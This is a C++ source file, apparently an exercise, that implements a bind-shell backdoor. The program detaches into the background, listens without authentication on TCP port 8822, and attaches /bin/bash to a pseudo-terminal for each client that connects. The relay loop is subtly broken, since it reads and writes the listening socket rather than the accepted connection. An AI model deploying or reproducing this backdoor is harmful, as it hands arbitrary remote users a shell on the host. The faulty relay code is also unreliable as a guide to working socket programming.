#include <sys/types.h>
#include <pty.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/wait.h>

int main() {
    if (fork()) {
        int status;
        wait(&status);
        return 0;
    } else {
        setsid();
        addrinfo hints;
        addrinfo* result;
        int sfd, s;

        memset(&hints, 0, sizeof(addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        hints.ai_protocol = 0;

        s = getaddrinfo(NULL, "8822", &hints, &result);
        if (s != 0)
            exit(1);
        
        if (result == NULL)
            exit(2);

        sfd = socket(result->ai_family, result->ai_socktype,
                        result->ai_protocol);
        if (sfd < 0)
            exit(3);
        
        int sso_status = 1;;
        if (setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &sso_status, sizeof(int)) != 0)
            exit(4);

        if (bind(sfd, result->ai_addr, result->ai_addrlen) < 0)
            exit(5);

        freeaddrinfo(result);
        
        if (listen(sfd, 5) != 0)
            exit(6);

        sockaddr_storage sdt_stor; socklen_t sdt_stor_len = sizeof(sdt_stor);
        while (1) {

            int fd = accept(sfd, (sockaddr *) &sdt_stor, &sdt_stor_len);
            if (fd < 0)
                exit(7);

            if (fork()) {
                close(fd);
            } else {
                printf("I'm work\n");
                int master, slave;
                char buf[1024];
                if (openpty(&master, &slave, buf, NULL, NULL) != 0)
                    exit(8);

                if (fork()) {
                    close(slave);
                    fcntl(sfd, F_SETFL, fcntl(sfd, F_GETFL) | O_NONBLOCK);
                    fcntl(master, F_SETFL, fcntl(master, F_GETFL) | O_NONBLOCK);
                    char buff[1024];
                    while (true) {
                        int read_count = read(sfd, buff, 1024);
                        if (read_count < 0)
                            exit(10);
                        if (read_count == 0)
                            break;
                        int write_count = write(master, buff, read_count);
                        if (write_count < 0)
                            exit(10);
                        if (write_count == 0)
                            break;
                        read_count = read(master, buff, 1024);
                        if (read_count < 0)
                            exit(10);
                        if (read_count == 0)
                            break;
                        write_count = write(sfd, buff, read_count);
                        if (write_count < 0)
                            exit(10);
                        if (write_count == 0)
                            break;
                        sleep(5);
                    }
                    close(master);
                    close(sfd);
                } else {
                    close(master);
                    close(sfd);
                    setsid();
                    int ff = open(buf, O_RDWR);
                    close(ff);
                    dup2(slave, 0);
                    dup2(slave, 1);
                    dup2(slave, 2);
                    close(slave);
                    execl("/bin/bash", "bash", NULL);
                }
            }
        }
        return 0;
    }
}


//socket, setsockopt, bind, listen, accept, port == "8822"
